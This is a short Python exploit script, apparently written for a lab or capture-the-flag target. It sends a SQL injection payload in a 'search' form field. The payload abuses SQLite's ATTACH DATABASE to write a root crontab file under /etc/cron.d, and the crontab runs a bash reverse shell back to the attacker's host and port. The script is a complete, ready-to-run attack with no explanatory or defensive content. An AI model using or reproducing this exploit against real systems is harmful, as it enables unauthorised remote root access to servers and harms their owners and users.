import requests
import sys
import argparse
import os
import datetime
def exploit(target_url, lhost, lport):
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Reverse Shell to: {lhost}:{lport}")
    target_file = f"/etc/cron.d/{os.urandom(4).hex()}"
    payload = "';"
    payload += f"ATTACH DATABASE '{target_file}' AS cron;"
    payload += "CREATE TABLE cron.tab (dataz text);"
    cron_command = f"* * * * * root bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    payload += f"INSERT INTO cron.tab (dataz) VALUES (char(10)||'{cron_command}'||char(10));"
    payload += "--"

    print(f"[*] Sending payload...")
    # print(f"[*] Payload: {payload}")

    try:
        response = requests.post(target_url, data={'search': payload})
        print(f"[*] Request sent. Status Code: {response.status_code}")
        if response.status_code == 200:
            print(f"[+] Exploit should be successful. Please wait for {60 - datetime.datetime.now().second} seconds for the cron...")
        else:
            print(f"[-] Unexpected status code: {response.status_code}")
            print(f"Response: {response.text}")
            
    except Exception as e:
        print(f"[-] Error sending request: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='SQLite Dirty File Write -> Crontab Exploit')
    parser.add_argument('url', help='Target URL (e.g., http://target:30024)')
    parser.add_argument('lhost', help='Local IP for reverse shell')
    parser.add_argument('lport', help='Local Port for reverse shell')

    args = parser.parse_args()
    
    exploit(args.url, args.lhost, args.lport)
